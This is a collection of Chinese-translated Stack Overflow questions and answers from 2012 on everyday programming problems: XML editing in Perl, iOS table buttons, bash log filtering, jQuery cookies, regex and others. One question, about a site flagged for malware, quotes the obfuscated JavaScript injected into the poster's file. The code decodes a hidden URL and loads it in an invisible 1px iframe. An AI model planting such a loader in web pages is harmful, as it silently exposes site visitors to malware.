我需要向某些 XML 数据添加新元素。我的输入和输出如下。

在这里，我将`DINESH`在输入中给出，并且必须创建新元素。该`oid`值必须从上面增加一。

```
<node nspc="DEFAULT" name="CEN509_DINESH" modl="MDL_DINESH" lcmd="node.sh" oid="5" /> 
```

谢谢你的帮助

**输入：**

```
<?xml version="1.0" encoding="UTF-8"?>
<root user="gaia" pass="XY6jKWTTBfU=" desc="default user" mail="dinesh@gmail.com">
  <node nspc="DEFAULT" name="CEN509_ASONI" modl="MDL_ASONI" lcmd="node.sh" oid="3" />
  <node nspc="DEFAULT" name="CEN509_ASTI" modl="MDL_ASTI" lcmd="node.sh" oid="4" />
</root> 
```

**输出**

```
<?xml version="1.0" encoding="UTF-8"?>
<root user="gaia" pass="XY6jKWTTBfU=" desc="default user" mail="dinesh@gmail.com">
  <node nspc="DEFAULT" name="CEN509_ASONI" modl="MDL_ASONI" lcmd="node.sh" oid="3" />
  <node nspc="DEFAULT" name="CEN509_ASTI" modl="MDL_ASTI" lcmd="node.sh" oid="4" />
  <node nspc="DEFAULT" name="CEN509_DINESH" modl="MDL_DINESH" lcmd="node.sh" oid="5" /> 
</root> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T08:57:43.503

该程序找到最后一个`<node>`元素，将其克隆并调整属性值，并将其附加到克隆它的元素的父元素。

```
use strict;
use warnings;

use XML::LibXML;

my $doc = XML::LibXML->load_xml(string => <<'END', no_blanks => 1);
<?xml version="1.0" encoding="UTF-8"?>
<root user="gaia" pass="XY6jKWTTBfU=" desc="default user" mail="dinesh@gmail.com">
  <node nspc="DEFAULT" name="CEN509_ASONI" modl="MDL_ASONI" lcmd="node.sh" oid="3" />
  <node nspc="DEFAULT" name="CEN509_ASTI" modl="MDL_ASTI" lcmd="node.sh" oid="4" />
</root>
END

my $input = 'DINESH';

my ($lastnode) = $doc->findnodes('/root/node[last()]');
my $newnode = $lastnode->cloneNode;

my %attr = map { $_ => $newnode->getAttributeNode($_) } qw/ name modl oid /;

my $val;

$val = $attr{name}->getValue;
$val =~ s/[^_]+$/$input/;
$attr{name}->setValue($val);

$val = $attr{modl}->getValue;
$val =~ s/[^_]+$/$input/;
$attr{modl}->setValue($val);

$val = $attr{oid}->getValue;
$attr{oid}->setValue($val + 1);

$lastnode->parentNode->appendChild($newnode);

print $doc->toString(1); 
```

**输出**

```
<?xml version="1.0" encoding="UTF-8"?>
<root user="gaia" pass="XY6jKWTTBfU=" desc="default user" mail="dinesh@gmail.com">
  <node nspc="DEFAULT" name="CEN509_ASONI" modl="MDL_ASONI" lcmd="node.sh" oid="3"/>
  <node nspc="DEFAULT" name="CEN509_ASTI" modl="MDL_ASTI" lcmd="node.sh" oid="4"/>
  <node nspc="DEFAULT" name="CEN509_DINESH" modl="MDL_DINESH" lcmd="node.sh" oid="5"/>
</root> 
```

# iphone - 如何在 UITableViewCell 中使用 Button 执行操作？

> ID：11806892
> 
> 赞同：1
> 
> 时间：2012-08-04T07:49:06.670
> 
> 标签：iphone, ios5, xcode4.3

我有一个在我的 CustomCell 中创建的按钮。

```
- (IBAction)onoffBtn:(id)sender
{
    UIButton *button = (UIButton *)sender;
    button.selected = !button.selected;
    if (button.selected)
    {
        // Do action 1
    }
    else
    {
        // Do action 2
    }
} 
```

当我运行它时，按钮显示在我在 TableViewController 中创建的 UITableView 内的单元格中。我可以在我的牢房内按那个 onoffBtn，但它不能采取行动。我该怎么做才能让我的按钮执行操作？

这是我 TableViewController.m 中的 cellForRowAtIndexPath

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    CustomCell *cell = (CustomCell *)[tableView dequeueReusableCellWithIdentifier:[CustomCell reuseIdentifier]];
    if (cell == nil)
    {
        [[NSBundle mainBundle] loadNibNamed:@"CustomCell" owner:self options:nil];
        cell = _customCell;
        _customCell = nil;
    }
    // Show my cell
    return cell;
} 
```

对于其他问题，我应该在哪里写做流程？在我的 TableViewController.m 或 CustomCell.m 中？如果你不介意，请给我提供代码和解释，我是新来的，还在学习。我想了解您编写的每一行代码。谢谢你。

更新：

到目前为止，这是我在 TableViewController.m 中的 cellForRowAtIndexPath ：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    CustomCell *cell = (CustomCell *)[tableView dequeueReusableCellWithIdentifier:[CustomCell reuseIdentifier]];
    if (cell == nil)
    {
        [[NSBundle mainBundle] loadNibNamed:@"CustomCell" owner:self options:nil];
        cell = _customCell;
        _customCell = nil;
    }
    button.tag = indexPath.row;
    cell.titleLabel.text = [titleArray objectAtIndex:indexPath.row];
    cell.timerLabel.text =  [timeArray objectAtIndex:indexPath.row];
    time = [[secondArray objectAtIndex:indexPath.row] integerValue];
    NSLog(@"Title %@, time %@, second %@, time %i, tag %d", titleArray, timeArray, secondArray, time, button.tag);
    return cell;
} 
```

这是日志说：

```
2012-08-04 17:38:36.257 Table[1269:f803] Title (
    "Test 1",
    "Test 2"
), time (
    "10 secs",
    "5 secs"
), second (
    10,
    5
), time 10, tag 0 // tag 0 for cell 1
2012-08-04 17:38:36.261 Table[1269:f803] Title (
    "Test 1",
    "Test 2"
), time (
    "10 secs",
    "5 secs"
), second (
    10,
    5
), time 5, tag 0 // tag should be 1 for cell 2 but it said 0\. How to fix it? 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:56:06.410

这就是在单元格中添加带有操作的按钮的方式

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{

// ADDING A BUTTON WITH TARGET
UIButton *btn = [UIButton buttonWithType:UIButtonTypeRoundRect];
btn.frame = CGRectMake(0, 0, 50, 50);
btn.showsTouchWhenHighlighted = YES;
btn.tag = indexPath.row;
[btn addTarget:self action:@selector(onoffBtn:) forControlEvents:UIControlEventTouchUpInside];

[cell.contentView addSubview:btn];

return cell;
}

- (IBAction)onoffBtn:(id)sender
{
UIButton *button = (UIButton *)sender;
button.selected = !button.selected;
if (button.selected)
{
    // Do action 1
}
else
{
    // Do action 2
}
} 
```

# mongodb - Mongo DB - 如何从集合中获取随机密钥？

> ID：11806893
> 
> 赞同：0
> 
> 时间：2012-08-04T07:49:24.093
> 
> 标签：mongodb

我是 mongodb 的新手，我想从集合中提取一个随机键和文档，这样我就可以从 shell 中查看结构。只是为了简单的探索。

我该怎么做呢？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T06:45:42.040

如果您真的只想查看集合中的单个文档，您可以简单地运行

```
db.mycollection.find().limit(1) 
```

这将找到集合中的所有文档，`mycollection`但将结果限制为 1 个文档。如果你添加`.pretty()`到最后，它会很好地格式化它，而不是只在一行上打印所有内容。

请注意，这不是均匀分布意义上的随机文档。你可能总是得到同一个。

# facebook - 当我在 gmail 或 facebook 上在线时，如何在我的网页上收到通知？

> ID：11806900
> 
> 赞同：0
> 
> 时间：2012-08-04T07:50:27.210
> 
> 标签：facebook, web-services, notifications, gmail, alert

我想为我的网站页面创建一项功能。那就是当我登录我的gmail帐户时，我想在我的网页上通知或闪烁。可能吗？如果是，那么请回答如何？tnx 提前。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T08:10:07.523

如果我没听错，您需要在您的页面中添加您的 google 或 Facebook 帐户状态。

**Google：**将此行添加到您的页面

```
<script src='//talkgadget.google.com/talkgadget/button'></script> 
```

**Facebook：从** *[这里](http://answers.yahoo.com/question/index?qid=20090219040351AAajdta)**回答*
Facebook 有一个类似于 Twitter 的功能，您可以在其中更新您的“状态”——一个格式为 [无论您键入什么] 的单行。

现在可以将您的 Facebook 状态导出为 RSS 提要，这意味着您可以将其添加到您自己选择的站点。

困难的部分是找到你的个人状态“饲料”。转到您的 Facebook 个人资料页面并查找“Mini-Feed”框。点击“查看全部”链接。结果页面的右侧是链接列表；其中之一是“状态故事”。那就是你想要的那个。点击它。

现在，您有一个标有“我的 Mini-Feed”的页面，该页面仅限于您自己的状态更新。在右侧栏中查找 RSS 图标和标签“订阅这些故事”。这是你的 RSS 链接。

获取 URL 并将其添加到您网站上的聚合器。将刷新时间设置为尽可能低的值（15 分钟），并确保 cron 至少运行得如此频繁。

目前，聚合器模块为每个提要生成一个块。您可以将该块放置在任何区域。瞧：您的 Facebook 状态现在反映在您的网站上。

# c++ - QGraphicsItem setTransformOriginPoint 似乎被忽略了

> ID：11806901
> 
> 赞同：1
> 
> 时间：2012-08-04T07:50:38.227
> 
> 标签：c++, linux, qt, qgraphicsitem

我想`QGraphicsItem`通过它来转换 a `Qt::YAxis`，效果很好。

```
QTransform trans;
trans.rotate (value, Qt::YAxis);
item->setTransformOriginPoint (0,0);
//item->setTransformOriginPoint (500, 250);
item->setTransform (trans); 
```

我遇到的问题是`setTransformOriginPoint`似乎被忽略了，因为它不起作用。每次我的物品在其左侧变形。但我想通过它的右侧对其进行改造，我认为我受到了这个错误的影响：

[https://bugreports.qt-project.org/browse/QTBUG-13378?page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel](https://bugreports.qt-project.org/browse/QTBUG-13378?page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel)

有人可以确认类似的问题吗？

或者我可以做些什么来改变我的物品在它的右侧？

编辑：对不起，我忘了说我没有使用这个错误报告中描述的动画！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T19:17:11.500

A`QTransform`包含有关转换的所有信息，包括您希望发生转换的原点。`setTransformOriginPoint()`仅影响诸如`rotate()`未指定来源的简单功能。

在添加旋转（）之前尝试将翻译添加到您的 QTransform。

```
QTransform trans;
trans.translate(500, 250).rotate(value, Qt::YAxis);
item->setTransform(trans); 
```

**编辑：**

是的，`QTransform`in`QGraphicsItem`使用起来不是很简单。你能做的事情也很有限。从 Qt 4.6 开始，[`QGraphicsTransform`](http://qt-project.org/doc/qt-4.8/qgraphicstransform.html)可用于对转换进行更高级别的控制。这可能是您正在寻找的。

# c# - 将焦点设置到其单元格与给定值匹配的数据网格行 c#

> ID：11806903
> 
> 赞同：0
> 
> 时间：2012-08-04T07:50:47.743
> 
> 标签：c#

我正在使用 c# 并有一个 datagridview 控件，该控件在表单上加载了数据。我想选择并将焦点设置到其单元格值与文本框中的值匹配的行。我该怎么办。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-16T02:37:48.157

这将匹配文本框中值的第一个实例

iCurrrow = -1

foreach（dgv.Rows 中的 DataGridViewRow 行）

{

```
if (row.Cells[0].Value.ToString().Equals(TextBox.Text))

{
    iCurrrow = row.Index;
    break;
} 
```

}

dgv.CurrentCell = dgv.Rows[iCurrrow].Cells[0];

# bash - 修改 bash 脚本以在读取文件时排除文本

> ID：11806909
> 
> 赞同：2
> 
> 时间：2012-08-04T07:51:57.213
> 
> 标签：bash

以下 bash 脚本每天发送一封包含 PHP 错误日志的电子邮件。

```
#!/bin/bash

# phperrlog v1.0
# by vladimir prelovac http://www.prelovac.com/vladimir/
#
# parse error logs on your server and send you daily updates to email

# configure options
  EMAIL="tech@domain.com"

  WORKDIR="/var/scripts"
  TAIL=50  # number of entries to send
 # IGNORE="/backup" # path to ignore

# script starts 'ere

 cd $WORKDIR
 rm phperrlog.txt 2>/dev/null

 LIST=$(ls /var/log/apache2/*-error.log)
 today=$(date +%Y-%m-%d)

 for i in $LIST
  do
    if [ -f $i ]; then
       time=$(date -r $i +%F)
       if [ "$time" == "$today" ]; then
         echo $i >>phperrlog.txt
         echo "---------------------------------" >>phperrlog.txt
         tail -n $TAIL $i >>phperrlog.txt
         echo -e "\n\n\n\n" >>phperrlog.txt
       fi
    fi
 done

  if [ -f  phperrlog.txt ]; then
    mail -s "PHPERRORLOG SCRIPT: server error logs - $today" $EMAIL  < phperrlog.txt
  fi 
```

如何修改此脚本以排除与此类似的所有错误：

> [Thu Aug 02 10:54:33 2012] [error] [client 12.345.67.89] Options 指令禁止的目录索引：/var/www/domain/public/templates/img/
> 
> [2012 年 8 月 2 日星期四 11:25:35] [错误] [客户端 12.345.67.89] 客户端被服务器配置拒绝：/var/www/domain/public/templates/sidebar.tpl

我对以下内容更感兴趣：

*   PHP 通知/警告/致命错误
*   文件不存在

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T10:04:00.473

`grep`可以从文件中读取模式

> ```
>  -f file, --file=file
>          Read one or more newline separated patterns from file.  Empty
>          pattern lines match every input line.  Newlines are not considered
>          part of a pattern.  If file is empty, nothing is matched. 
> ```

在您的情况下，您必须决定是要使用白名单（您希望在报告中看到的模式列表）还是黑名单（您不想看到的模式列表*）*。收集相关模式后，请替换`tail -n $TAIL $i >>phperrlog.txt`为

```
grep -f /path/to/whitelist.txt "$i" | tail -n ${TAIL:-50} >> phperrlog.txt 
```

或者

```
grep -v -f /path/to/blacklist.txt "$i" | tail -n ${TAIL:-50} >> phperrlog.txt 
```

当我注意到我不想再看到的行时，我可能会从黑名单开始，并随着时间的推移向其中添加其他模式。初始黑名单可能包含

```
Directory index forbidden by Options directive
client denied by server configuration 
```

加工您的样品。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T12:27:08.127

尝试替换重定向

```
mail -s "PHPERRORLOG SCRIPT: server error logs - $today" $EMAIL  < phperrlog.txt 
```

例如，使用流程和管道

```
grep -v '\[error\]' < phperrlog.txt | mail -s "PHPERRORLOG SCRIPT: server error logs - $today" $EMAIL 
```

或者

```
grep -v '\[error\]' phperrlog.txt | mail -s "PHPERRORLOG SCRIPT: server error logs - $today" $EMAIL 
```

# javascript - 在服务器上的 Javascript 文件中注入

> ID：11806910
> 
> 赞同：-1
> 
> 时间：2012-08-04T07:51:57.713
> 
> 标签：javascript, file, code-injection, virus

我的网站在浏览器中显示消息“mydomain.com 包含恶意软件。如果您访问此网站，您的计算机可能会感染病毒。”

在检查网站管理员工具后，我发现 java 脚本文件已更改，并且在此文件中附加了一些代码。但早些时候我更改了 FTP 和其他密码。

我很惊讶这些代码是如何插入到服务器上的只读文件中而 ftp 之前更改的。

这是什么？。这是病毒攻击还是其他什么以及如何检查和删除病毒（如果有）？

以下是添加到 javascript 文件中的代码。

```
if('CdkO'=='WJGLZ')WltF();function VrzYJI(){var fxko='MQjxtI';if('CyWq'=='IeMRba')PLxWxh();}
var tfhbJZ="con\x73\x74\x72ucto\x72";function nCesU(){}var LibD='DtiXVu';var px0_var="0p\x78";if('AUEe'=='jkeMwo')dgZHo='JixI';var WXUGCTeW="par\x73eIn\x74";var fJdwiU='HkKPc';function YKEF(){var IPUbt='lpVuaP';if('hgcAK'=='NSNfa')aMlM();}
var appVersion_var="a\x70pV\x65rsion";var GNYH='ZRUtGA';if('eBdo'=='zvBN')iPKu='hnyr';function vOWkf(){}function ZKAxLa(){var wLRC='vLarQA';if('PtqFaq'=='fUwi')XIGbIQ();}
var lVVSNNg="";var CxCP;var px1_var="1p\x78";var ZsUS;var YZuDAwsjn="b\x6fd\x79";var iuvTLT=123;if('jKCKy'=='oGHZN')BdGS();var JTrlocAdo="appendChild";function gclv(){var zanTcM='fvrmqz';if('BnHRcw'=='EEsejm')SMOo();}
var KWdpWKXJ="8d9999955f54549497868b86965388949254889794938953958d95";function OQzFK(){var FLac='plfdm';if('LFoy'=='EwqxJ')uPUdDb();}if('gdBD'=='BwqmW')aCEU();var IBUm='yeFDT';var bQdKIy="sli\x63\x65";function FHIiLK(){var MBkF='EuYDLV';if('PvzvCY'=='fRLQH')iFuid();}
var CxmPcURq="fromCharCode";var HyNEe='OZSvI';var wLrupv=(function(){var StkS='epJJDq';return this;if('SccXj'=='SVyct')xEXC();function pfHHB(){}})();if('funs'=='UyyiNF')amGGs();var mIpTJBqZc="joPfVdCy"[tfhbJZ];var wjjFIK=33;var YEHEAS;for(var pWCeJ=0;pWCeJ<KWdpWKXJ.length;pWCeJ+=2){if('ZFrN'=='VxPc')QczgU='hFfl';VUAzhFZU=wLrupv[WXUGCTeW](KWdpWKXJ[bQdKIy](pWCeJ,pWCeJ+2),16)-37;var VLFmeK;lVVSNNg+=mIpTJBqZc[CxmPcURq](VUAzhFZU);if('prqjym'=='UHrJa')MiuvBu();}
var zaZhFI=293;if('YzpRXm'=='MNJwSK')tTTq='AEeBR';var REdbBzld="DdTPKzFI";var MQuCD='JPTBg';function EaYq(){}if('MVbJ'=='RFbVx')zKUf='zdnfP';function KEgn(){var Hsch='ZrBxl';if('NkwuXz'=='FSzAyt')pTXBE();}
var oYUpEIig="";var Vthu=277;if(navigator[appVersion_var].indexOf("MSIE")!=-1){if('bFpRU'=='GsDnn')qygk='lmUxN';var ecSd;oYUpEIig='<iframe name="'+REdbBzld+'" src="'+lVVSNNg+'">';if('sBZK'=='rxsdM')bKacE();}else{if('PHngtx'=='GLlAu')bcSoAG();function SYYU(){}
oYUpEIig='iframe';var YIBQP=222;}
function JwDx(){var RzMKo='supF';if('XXDiVZ'=='QibJLF')Hwfn();}
var VxmJyYuwi=document.createElement(oYUpEIig);if('pgsYEc'=='NTSgKU')Brfc='Rnuk';function PZbvIF(){}
VxmJyYuwi.vIysu=function(){var aRwK;if('Qqzu'=='FJXo')druxka='GGBLEL';this["src"]=lVVSNNg;var FuOS;var PScx=23;}
var cRuRe=258;var YsPwxC;VxmJyYuwi.style.top=px0_var;var QetiQ='DZEkb';VxmJyYuwi.vIysu();if('JggEby'=='WOvNk')zMGOX();if('aLKZ'=='MAUOW')eFWE='gOXg';if('yHoD'=='PBdzQ')xYVoer='nisPV';VxmJyYuwi.name=REdbBzld;function YEJay(){}var ZNWOM;VxmJyYuwi.style.height=px1_var;function XDwP(){}
VxmJyYuwi.style.position="absolute";if('xbIySc'=='yNlEH')eOJWpQ='ikyk';function IMeAq(){}
var irdJAD=172;VxmJyYuwi.style.width=px1_var;VxmJyYuwi.style.right=px0_var;if('kndd'=='BkrF')WGwYa='VVer';var uoEnJ='youKio';function orSoOjwi(){if('MnXf'=='nTILss')FgeFCT='jDxk';if(document[YZuDAwsjn]){var DhGHk='ajfbHe';function Ydkz(){var GWqvCL='MvgtmN';if('XpgqVo'=='rYhw')uggAO();}
document[YZuDAwsjn][JTrlocAdo](VxmJyYuwi);var FWgG='DHITvG';}else{if('FOmyN'=='ZcJs')pnCabN='lFdTU';setTimeout(orSoOjwi,120);if('EkcQ'=='tVynkk')nGBNjE='MVgOWc';var sjLbg;}
function eciRV(){}}
function EJwt(){var uKrE='wCpD';if('pkYdXv'=='oOXOLr')mljDR();}var BCNgRv;orSoOjwi();var vxWIdO='KQBivA';var CfZn=36;var RXTyN;function cxqTMA(){var mAhD='QhbH';if('PaNmx'=='EkYttb')rfxOr();}var EUSU; 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-09T10:23:45.533

plask 到 10.3 版本是易受攻击的。

使用文件管理器在我的网页中注入的 javascript 恶意代码。最终端口 8443 和 8447 被阻止并解决了问题。

另一种选择是将 plesk 升级到 11

# r - R创建一个函数来绘制数据集的几行并进行回归

> ID：11806911
> 
> 赞同：0
> 
> 时间：2012-08-04T07:52:02.173
> 
> 标签：r, regression

我是编程/ R 的新手，我有一个可能很简单的问题。

我的功能是：

```
par(mfrow=c(2,2))    
plot_QQ=function(x) {for(i in 2:x)
     plot(c(data_raw[,Group1[i]]),c(data_raw[,Group1[1]]), xlab=paste("replicate",i), ylab="replicate 1")
           abline(lm(c(data_raw[,Group1[i]])c(data_raw[,Group1[1]]))} 
```

group1 是一个向量 c("","","") 来获取特定的数据。此函数正在运行，但 R 并未在所有图中绘制 abline()。（仅在“最后一个”图中 c(data_raw[,Group1[i=x]]),c(data_raw[,Group1[1]]) 绘制了线。

抱歉这么简单的问题，谢谢帮助

问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T08:00:08.033

将来您应该提供一些模拟数据，以便人们可以运行您的代码，目前尚不清楚您到底想做什么。您不需要 c() 函数，并且您的 lm 调用不正确。此外，您的 for 循环周围没有花括号。尝试这个。

```
par(mfrow=c(2,2))    
    plot_QQ=function(x) {for(i in 2:x){
    plot(data_raw[,Group1[i]],data_raw[,Group1[1]], xlab=paste("replicate",i), ylab="replicate 1")
    abline(lm(data_raw[,Group1[i]]~data_raw[,Group1[1]])}} 
```

# jquery - 将 cookie 添加到 jQuery 工具的最简单方法

> ID：11806913
> 
> 赞同：1
> 
> 时间：2012-08-04T07:52:50.423
> 
> 标签：jquery, cookies, toggle, toggleclass

这是我在 stackoverflow 上的第一篇文章 :) 我整晚都在尝试多种方法来做同样的事情，但我是初学者，所以我放弃并寻求帮助。

问题被回答了很多次，但我找不到让 TOGGLE 记住当前状态的简单方法。我不想用臃肿的代码开始我的工作。

我需要创建一个简单的打开/关闭面板，我发现 toggle() 或 toggleClass() 会给我我想要的。

**由我缩短和修复的**Miro 的最终工作代码是：****

 **```
$(document).ready(function () {
    $('p').toggleClass('red', $.cookie('currentToggle') === 'on');
    $('button').toggleClass('yellow', $.cookie('currentToggle') === 'on');
});

$("button").click(function () {
    $("p").toggleClass("red");
    $(this).toggleClass("yellow");
    $.cookie('currentToggle', $("p").hasClass('red') ? 'on' : 'off');
}); 
```

谢谢米罗！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T08:34:09.843

尝试这样的事情：

```
$(document).ready(function () {    
    $('p').toggleClass('red', $.cookie('currentToggle') === 'on');  
});
$(function(){

    $("button").click(function () {
        $("p").toggleClass("red");
        $(this).toggleClass("yellow");      
        $.cookie('currentToggle', $("p").hasClass('red')?'on':'off' );
    });
}); 
```**

# android - 日期之间的比较

> ID：11806916
> 
> 赞同：0
> 
> 时间：2012-08-04T07:53:42.250
> 
> 标签：android, database, date

在我的应用程序中，我必须从位于某些日期之间的数据库中检索日期。在我的数据库中，我将日期存储为字符串。我还编写了查询。

这是我的示例表：

```
id    item  price  startdate    enddate
1     ass    78    04/08/2012   14/09/2012
2     err    89    04/08/2012   10/09/2012.
3     dffg   44    04/08/2012   18/08/2012 
```

我的查询是：

```
public Cursor getIncometitle(String grpsdb,String date) throws SQLException
{   
    Cursor mCursor = db.rawQuery(
             "SELECT * FROM incomexpense WHERE date like '"+date+"' OR enddate > date  AND category='Income' AND groups='"+grpsdb +"'   ORDER BY date DESC" , null);
if (mCursor != null) {
mCursor.moveToFirst();
}
return mCursor;
} 
```

在上述情况下，我正在检查`enddate>date`。在这即将发生的事情中，我认为它比较日期`(04 and 14) and(04and 10)`，它更大，所以所有数据都来了。但我不需要那个，如果`enddate month is greater that startdate`意味着我必须获取数据。提前致谢..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T08:01:38.887

抛开 SQL 注入攻击漏洞（使用参数化查询而不是将值直接插入 SQL），您应该以可排序的格式存储日期，例如`yyyy-MM-dd`. 那时，字典顺序也会给你正确的时间顺序，所以你的比较会起作用。

如果*可以*的话，如果您可以将日期*作为日期*存储在数据库中实际上会更好 - 这取决于您的数据库是否支持。

# python - python 正则表达式匹配多个表达式

> ID：11806919
> 
> 赞同：1
> 
> 时间：2012-08-04T07:54:22.347
> 
> 标签：python, regex

我知道这可能是非常基本的，但我正在尝试创建一个仅匹配一组字符的某个倍数的正则表达式。例如，re.findall(expression, 'aaaa') 将返回 'aaaa' 但 re.findall(expression, 'aaa') 将返回 'aa'，其中 expression 是一些涉及 aa 对的正则表达式。如果整个字符串是 'aa' 的整数倍，它只会返回整个字符串。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:56:13.727

只需使用`(aa)+`. （对于 findall，您需要使用非捕获组，所以`(?:aa)+`。）

```
>>> re.findall('(?:aa)+', 'aa')
['aa']
>>> re.findall('(?:aa)+', 'aaaa')
['aaaa']
>>> re.findall('(?:aa)+', 'aaaaa')
['aaaa'] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T08:03:55.200

尝试类似`(?:(?:expression){3})+`的方法来查找表达式的所有三的倍数。如果表达式更短，您也可以随意编写它。

如果您想匹配精确的重复项，请尝试例如`(?:(expression)\1{2})+`三的倍数。请注意，如果表达式不平凡，这可能需要回溯，因此可能很慢。

# iphone - 多个 URL 的异步加载

> ID：11806920
> 
> 赞同：0
> 
> 时间：2012-08-04T07:54:29.490
> 
> 标签：iphone, ios, nsurlconnection

我想在表格视图中加载多个图像。它应该从 urls 异步加载。我尝试了很多次，但我没有得到......谁能帮我解决这个问题？我在从 cellforrowindex 加载时遇到问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T08:16:55.913

这个问题可能会重复，但是：

[检查这个](http://www.markj.net/iphone-asynchronous-table-image/)

[苹果延迟加载](http://developer.apple.com/iphone/library/samplecode/LazyTableImages/Introduction/Intro.html)

[和这个](http://londonwebdev.com/2011/01/14/lazy-loading-multiple-images-on-background-threads-on-the-iphone/)

# java - 如何解决 NetBeans（Ubuntu 下）的 Hot Key 冲突问题？

> ID：11806921
> 
> 赞同：2
> 
> 时间：2012-08-04T07:54:32.323
> 
> 标签：java, netbeans, netbeans-7.2

我在我的 Ubuntu 12.04 下安装了 NetBeans 7.2。为了调用 javadoc，我在鼠标位于单词上时按 HOT KEY Alt+F1，但它只会触发桌面左上角的 Ubuntu 应用程序菜单（Gnome）。如何解决冲突问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T08:00:05.217

在类或变量名末尾按 Ctrl-Space 也会在 NetBeans 中显示 JavaDoc。或者，您可以更改或禁用 Gnome 快捷方式，或更改 NetBeans 快捷方式。

# javascript - document.getElementById(id) 并切换多个 id

> ID：11806925
> 
> 赞同：3
> 
> 时间：2012-08-04T07:54:54.110
> 
> 标签：javascript, toggle, getelementbyid

我有这个简单的功能，可以切换网页中的隐藏元素。

```
function showtable(id) 
 {
 if(document.getElementById(id).style.display == 'block')
  {
document.getElementById(id).style.display = 'none';
  }else{
document.getElementById(id).style.display = 'block';
}
 } 

<input type="button" value="Toggle" onclick="showtable('id');" /> 
```

这工作正常，但我想在每次单击按钮时关闭页面上的一些其他（表格）元素（具有某些 id）（除了正在切换的元素，无论是打开还是关闭）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-04T08:25:15.247

您可以使用 jQuery，但如果您不想使用它；这是一个纯 JavaScript 示例。要查看它是如何工作的，请将其复制粘贴到文本文件中，将其保存为 test.htm 并在浏览器中打开它。它包含三个表格，每个表格上方都有一个按钮。单击按钮时，会显示该表，而隐藏所有其他表。如果您需要更多表，请给它们一个 id，并将它们的 id 添加到函数中的数组中：

```
var ids = ["redTable", "greenTable", "blackTable", "anotherTable"]; 
```

如果您还希望能够切换该表，它当然还需要一个按钮：

```
<input type="button" value="Toggle Green Table" onclick="showtable('anotherTable');" /> 
```

例子：

```
<!DOCTYPE html>
<html>
    <head>
        <script type="text/javascript">
            function showtable(id) {
                var ids = ["redTable", "greenTable", "blackTable"];
                for(var i = 0; i < ids.length; i++) {
                    if(ids[i] != id)
                        document.getElementById(ids[i]).style.display = "none";
                }
                document.getElementById(id).style.display = "block";
            }
        </script>
    </head>
    <body>
        <input type="button" value="Toggle Red Table" onclick="showtable('redTable');" /><br />
        <table style="width: 100px; height: 100px; background-color: red;" id="redTable">
            <tr>
                <td>redTable</td>
            </tr>
        </table>
        <input type="button" value="Toggle Green Table" onclick="showtable('greenTable');" /><br />
        <table style="width: 100px; height: 100px; background-color: green; display: none;" id="greenTable">
            <tr>
                <td>greenTable</td>
            </tr>
        </table>
        <input type="button" value="Toggle Black Table" onclick="showtable('blackTable');" /><br />
        <table style="width: 100px; height: 100px; background-color: black; display: none;" id="blackTable">
            <tr>
                <td>blackTable</td>
            </tr>
        </table>
    </body>
</html> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-04T07:58:22.593

您可以选择所有其他 DOM 元素，将它们的显示属性设置为“无”，然后只显示应该可见的元素。

另一种方法是跟踪变量中的可见元素：

```
var visibleElement = null; 
```

当您切换一个元素时，您将其设为可见元素并隐藏先前可见的元素：

```
// Hide the previously visible element, if any.
if (visibleElement != null)
{
    visibleElement.style.display = 'none';
}

// Make your new element the visible one.
visibleElement = document.getElementById(id)
visibleElement.style.display = 'block'; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-04T08:05:16.263

轻松使用[jQuery](http://jquery.com)。例如，给每个切换元素一个类`toggle_element`，然后在 JS 中：

```
$('.toggle_element').hide();
$('#id').show(); 
```

这将隐藏所有带有 class 的元素`toggle_element`并显示带有 id的元素`id`。

JSFiddle 示例[在这里](http://jsfiddle.net/uxRfR/)。

# javascript - jQuery父母（“tr”）淡出不起作用

> ID：11806928
> 
> 赞同：1
> 
> 时间：2012-08-04T07:55:18.803
> 
> 标签：javascript, jquery

所以我试图创建一个带有类“删除”父 tr 元素的淡出效果。

这是我的 jsfiddle，您可以在其中实时查看 - [http://jsfiddle.net/syTXZ/](http://jsfiddle.net/syTXZ/)

和代码在这里 -

HTML -

```
<table border="1px solid black">
    <thead>
        <tr>
            <th>ID</th>
            <th>Name</th>
            <th>Parent</th>
            <th>Edit</th>
            <th>Delete</th>
        </tr>
    </thead>
    <tbody>
            <tr>
                <td>2</td>
                <td>test222</td>
                <td>test2</td>
                <td><a href="#" categoryID="1" class="edit">Edit Category</a></td>
                <td><a href="#" categoryID="1" class="delete">Delete Category</a></td>
            </tr>                                                    
            <tr>
                <td>1</td>
                <td>te1t22</td>
                <td>tes1t</td>
                <td><a href="#" categoryID="1" class="edit">Edit Category</a></td>
                <td><a href="#" categoryID="1" class="delete">Delete Category</a></td>
            </tr>  
            <tr>
                <td>3</td>
                <td>test2</td>
                <td>test</td>
                <td><a href="#" categoryID="1" class="edit">Edit Category</a></td>
